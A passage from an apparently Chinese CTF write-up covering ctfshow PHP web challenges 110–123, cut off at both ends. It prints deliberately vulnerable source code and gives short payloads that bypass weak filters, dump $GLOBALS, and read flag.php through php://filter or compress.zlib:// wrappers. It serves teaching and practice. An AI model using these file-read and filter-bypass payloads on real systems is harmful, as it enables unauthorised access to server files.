class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span><br>	&#125;<br>	<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Object name:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myclass</span>(<span class="hljs-string">&quot;My Object&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>; <span class="hljs-comment">// 输出对象的字符串表示，自动调用__toString()方法</span><br><span class="hljs-meta">?&gt;</span><br><br>输出<br>Object name:My Object<br></code></pre></td></tr></table></figure>

<p><strong>php中，自带 <code>__toString()</code>方法的内置类有：<code>DataTime</code>、<code>Exception</code>、<code>SimpleXMLElement</code>。</strong></p>
<hr>
<h2 id="web-110（-toString-方法、FilesystemIterator类利用）"><a href="#web-110（-toString-方法、FilesystemIterator类利用）" class="headerlink" title="web-110（__toString()方法、FilesystemIterator类利用）"></a>web-110（__toString()方法、<strong>FilesystemIterator</strong>类利用）</h2><p>源码：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>利用FilesystmIterator文件系统迭代器</strong></p>
<p>因为过滤的原因，原来的payload用不了了。这里使用<code>FilesystemIterator</code>遍历文件系统中的文件和目录，<code>getcwd()</code>获取当前目录（不需要传参，也就用不到单双引号）。<strong>本质就是获取当前目录下的文件。</strong></p>
<p>payload：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-symbol">=Filesystemiterator</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=getcwd</span><br><br>然后访问fl36dga.txt<br><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-111（超全局变量-GLOBALS）"><a href="#web-111（超全局变量-GLOBALS）" class="headerlink" title="web-111（超全局变量$GLOBALS）"></a>web-111（超全局变量$GLOBALS）</h2><p>源码：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>function getFlag(&amp;$v1,&amp;$v2)&#123;<br>    eval(<span class="hljs-string">&quot;$$v1 = &amp;$$v2;&quot;</span>);<br>    var_dump($$v1);<br>&#125;<br><br><br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            getFlag($v1,$v2);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>$GLOBALS 超全局变量利用</strong></p>
<p><strong>$GLOBALS — 引用全局作用域中可用的全部变量</strong><br><strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</strong></p>
<p><strong>首先这里v1的值必须是ctfshow才能通过正则，然后eval(“$$v1 &#x3D; &amp;$$v2;”);进行了赋值操作，将v2的值赋给了v1，我们将v2赋值为GLOBALS，那么v2就会赋值给v1，然后var_dump($$v1)会将$GLOBASL全局变量中的数据全部输出</strong></p>
<p>payload：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-symbol">=ctfshow</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=GLOBALS</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-superglobals.html">php超级全局变量详解</a></p>
<hr>
<h2 id="web-112（is-file-、php伪协议-filter-）"><a href="#web-112（is-file-、php伪协议-filter-）" class="headerlink" title="web-112（is_file()、php伪协议(filter)）"></a>web-112（is_file()、php伪协议(filter)）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这里我们需要绕过is_file()函数，我们要传一个文件名但是不能被识别为文件。<code>is_file()</code>检查指定路径是否为一个普通文件。这里我们可以使用php伪协议进行绕过，is_file认为伪协议不是一个文件，<code>而highlight_file</code>认为伪协议是文件。所以可以实现绕过。</strong><br><strong>最后highlight_file就会将指定文件的源代码以HTML格式进行高亮显示并输出到浏览器即可拿到flag</strong></p>
<p>payload：</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//filter/resource=flag.php</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="php伪协议（filter）"><a href="#php伪协议（filter）" class="headerlink" title="php伪协议（filter）"></a>php伪协议（filter）</h3><p>php:&#x2F;&#x2F;filter是php中的伪协议主要用于在输入和输出流上应用过滤器。基本语法是：php:&#x2F;&#x2F;filter&#x2F;<filter>&#x2F;resource，其中<filter>是要应用的过滤器名称，resource是要过滤的资源。</filter></filter></p>
<pre><code>过滤读取的数据
//先读取flag.php的内容，再进行base64编码，也就是说以后呈现的内容是经过base64编码后的内容。
file_get_contents(&#39;php://filter/write=convert.base64-encode/resource=flag.php&#39;） 

过滤写入的数据
// 先将字符串hello world进行base64编码，再写入flag.php文件中，写的时候是先进行base64解码，再写。也就是说在写的时候，先执行php://filter/write=convert.base64-decode对字符串进行解码。
$data=&#39;hello world&#39;;
file_put_contents(&#39;php://filter/write=convert.base64-decode/resource=flag.php&#39;，base64($data))
</code></pre>
<hr>
<h2 id="web-113（is-file、php伪协议-zlib-）"><a href="#web-113（is-file、php伪协议-zlib-）" class="headerlink" title="web-113（is_file、php伪协议(zlib)）"></a>web-113（is_file、php伪协议(zlib)）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>filter伪协议被过滤了，这里可以使用<code>zlib://</code>伪协议，</strong></p>
<p>使用zlib:&#x2F;&#x2F;伪协议将数据压缩并写入文件compress_data.txt.gz中；使用zlib:&#x2F;&#x2F;伪协议从压缩的文件中读取解压缩的数据。<br><strong>compress.zlib:&#x2F;&#x2F;flag.php读取 gz 压缩或普通输入文件。</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">zlib:<span class="hljs-regexp">//</span>伪协议<br><span class="hljs-regexp">//</span>压缩数据<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;Hello,World!&#x27;</span>;<br>file_put_content(<span class="hljs-string">&#x27;zlib://compressed_data.txt.gz&#x27;</span>,<span class="hljs-variable">$data</span>)<br><br><span class="hljs-regexp">//</span> 解压缩数据<br><span class="hljs-variable">$decompressedData</span> = file_get_contents(<span class="hljs-string">&#x27;zlib://compressed_data.txt.gz&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-114（is-file、php伪协议-filter-）"><a href="#web-114（is-file、php伪协议-filter-）" class="headerlink" title="web-114（is_file、php伪协议(filter)）"></a>web-114（is_file、php伪协议(filter)）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这里没有过滤<code>filter</code>，所以直接构造payload</p>
<p>payload：</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//filter/resource=flag.php</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-115（is-numeric-、trim-）"><a href="#web-115（is-numeric-、trim-）" class="headerlink" title="web-115（is_numeric()、trim()）"></a>web-115（is_numeric()、trim()）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;<br>&#125;<br><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>triim()：去除字符串首尾的空格或其他指定字符。使用%0c（换页符）进行绕过</p>
<p>is_numeric：判断变了是否为数字或数字字符串。绕过方法：%0c（换页符），%20空格符、%0a换行符</p>
<p><code>！==</code>：强不等于，必须值相等，且类型相等。</p>
<p>这里要求if判断内全为true，且$num&#x3D;&#x3D;’36’也为true</p>
<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?num<span class="hljs-operator">=</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift">语法<br>trim(string,charlist)<br><br>参数	描述<br>string	        必需<span class="hljs-operator">。</span>规定要检查的字符串<span class="hljs-operator">。</span><br>charlist	    可选<span class="hljs-operator">。</span>规定从字符串中删除哪些字符<span class="hljs-operator">。</span>如果省略该参数，则移除下列所有字符：<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\0</span>&quot;</span>       <span class="hljs-operator">-</span> <span class="hljs-type">NULL</span><br>                <span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>       <span class="hljs-operator">-</span> 制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>       <span class="hljs-operator">-</span> 换行<br>                <span class="hljs-string">&quot;\x0B&quot;</span>     <span class="hljs-operator">-</span> 垂直制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\r</span>&quot;</span>       <span class="hljs-operator">-</span> 回车<br>                <span class="hljs-string">&quot; &quot;</span>        <span class="hljs-operator">-</span> 空格<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-123（GET-POST传递变量特性（-））"><a href="#web-123（GET-POST传递变量特性（-））" class="headerlink" title="web-123（GET&#x2F;POST传递变量特性（[））"></a>web-123（GET&#x2F;POST传递变量特性（<code>[</code>））</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<ul>
<li>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、[，+、点转换为下划线，而传入[之后后面的空格、[，+、点就不会被转为下划线了</li>
<li>题目里的$c&lt;&#x3D;18，左边是字符串，右边是数字，<code>&lt;=</code>恒成立；如果左右两边都是字符串，会先比较第一个字母的ASCII码值，如果相同，再比较长度，然后逐一比较</li>
</ul>
<p>payload：</p>
